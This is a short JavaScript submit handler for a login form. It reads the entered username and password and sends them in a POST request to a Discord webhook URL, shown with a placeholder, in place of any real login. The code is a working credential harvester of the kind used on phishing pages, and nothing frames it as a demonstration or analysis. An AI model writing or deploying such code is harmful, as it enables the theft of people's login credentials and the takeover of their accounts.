document.getElementById('login-form').addEventListener('submit', function(event) {
  event.preventDefault();

  const username = document.getElementById('username').value.trim();
  const password = document.getElementById('password').value.trim();

  if (username === '' || password === '') {
    alert('Please enter a username and password.');
    return;
  }

  const data = {
    username: username,
    password: password
  };

  const xhr = new XMLHttpRequest();
  xhr.open('POST', 'https://discord.com/api/webhooks/WEBHOOK_URL', true);
  xhr.setRequestHeader('Content-Type', 'application/json');

  xhr.onload = function() {
    if (xhr.status === 200) {
      console.log('Request sent successfully.');
    } else {
      console.error('Request failed. Status code: ' + xhr.status);
    }
  };

  xhr.onerror = function() {
    console.error('Network error.');
  };

  xhr.send(JSON.stringify(data));
});
